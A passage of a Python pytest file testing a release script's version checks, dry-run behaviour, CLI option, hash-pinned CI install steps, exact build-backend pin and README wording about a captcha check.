    calls = []
    real_run = subprocess.run

    def watch(argv, *args, **kwargs):
        calls.append(argv[0] if isinstance(argv, list) else argv)
        return real_run(argv, *args, **kwargs)

    monkeypatch.setattr(release_script.subprocess, "run", watch)
    release_script.build(root, tmp_path / "out", dry_run=True)
    assert set(calls) == {"git"}  # git only: uv and pytest are faked here, npx no longer exists
    assert not hasattr(release_script, "npx") and "mcpb@" not in (ROOT / "scripts" / "release.py").read_text()


# --- C1: a release must be above the last one --------------------------------------------------

def test_a_version_not_above_the_last_release_is_refused(tmp_path, capsys):
    root = repo(tmp_path, "0.9.1", tags=["v0.9.1"])
    release_script.check_newer(root, "0.9.1", [])  # no earlier tag: accepted, with a note
    assert "no earlier release found" in capsys.readouterr().err
    (root / "pyproject.toml").write_text('[project]\nname = "kw-mcp"\nversion = "0.9.0"\n')
    for args in (["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qam", "y"], ["tag", "v0.9.0"]):
        subprocess.run(["git", *args], cwd=root, check=True, capture_output=True)
    with pytest.raises(release_script.ReleaseError, match=r"0\.9\.0 is not above the last release 0\.9\.1 \(tag v0\.9\.1\)"):
        release_script.check_newer(root, "0.9.0", [])
    latest = tmp_path / "latest.json"
    latest.write_text(json.dumps({"version": "1.0.0"}))
    with pytest.raises(release_script.ReleaseError, match=r"1\.0\.0 is not above the last release 1\.0\.0"):
        release_script.check_newer(root, "1.0.0", [latest])
    release_script.check_newer(root, "1.0.1", [latest, tmp_path / "missing.json"])
    latest.write_text("not json")
    with pytest.raises(release_script.ReleaseError, match="can't read"):
        release_script.check_newer(root, "1.0.1", [latest])


def test_the_build_checks_the_last_dist_release(tmp_path, monkeypatch):
    root = repo(tmp_path, tags=["v0.9.1"], ignore="dist/\n")
    (root / "dist" / "release").mkdir(parents=True)
    (root / "dist" / "release" / "latest.json").write_text(json.dumps({"version": "0.9.1"}))  # already released
    fake_release_steps(monkeypatch)
    with pytest.raises(release_script.ReleaseError, match="never deployed, delete it"):
        release_script.build(root, tmp_path / "out")
    assert not (tmp_path / "out").exists()
    release_script.build(root, tmp_path / "out", dry_run=True)  # a rehearsal only warns


def test_the_cli_takes_the_bridges_latest_json(tmp_path, monkeypatch, capsys):
    seen = {}
    monkeypatch.setattr(release_script, "build", lambda root, out, dry_run=False, last_manifest=None: seen.update(
        out=out, last=last_manifest))
    latest = tmp_path / "latest.json"
    latest.write_text("{}")
    assert release_script.main(["--last-latest-json", str(latest)]) == 0 and seen["last"] == latest
    with pytest.raises(SystemExit):
        release_script.main(["--last-latest-json", str(tmp_path / "missing.json")])
    assert "does not exist" in capsys.readouterr().err


# --- B2, S30, S29: workflows, build backend, wording ------------------------------------------

def test_ci_installs_a_built_wheel_with_hash_checked_pins():
    text = (ROOT / ".github" / "workflows" / "agent-install.yml").read_text(encoding="utf-8")
    assert "--constraints exported.txt ." not in text  # uv refuses to build "." under --no-build
    assert text.count("uv build --wheel --out-dir dist-ci") == 2 and text.count("--require-hashes") == 2
    packaging = (ROOT / ".github" / "workflows" / "packaging.yml").read_text(encoding="utf-8")
    assert "scripts/release.py pack" in packaging and "mcpb@2.1.2 pack" not in packaging
    assert "mcpb@2.1.2 validate" in packaging and "mcpb@2.1.2 unpack" in packaging


def test_the_build_backend_is_pinned_exactly():
    import tomllib

    requires = tomllib.loads((ROOT / "pyproject.toml").read_text(encoding="utf-8"))["build-system"]["requires"]
    assert requires == ["uv_build==0.13.1"]
    assert "uv_build" in (ROOT / "README.md").read_text(encoding="utf-8")


def test_docs_say_what_the_captcha_check_sends():
    readme = (ROOT / "README.md").read_text(encoding="utf-8")
    plan = (ROOT / "docs" / "plan.md").read_text(encoding="utf-8")
    assert "비밀번호 없이 다시 확인" not in readme and "로그인 토큰" in readme and "LoginConfirm.do" in readme
    assert "10분 동안 재시도 안 함" not in plan and "바뀔 때까지 재시도 안 함" in plan
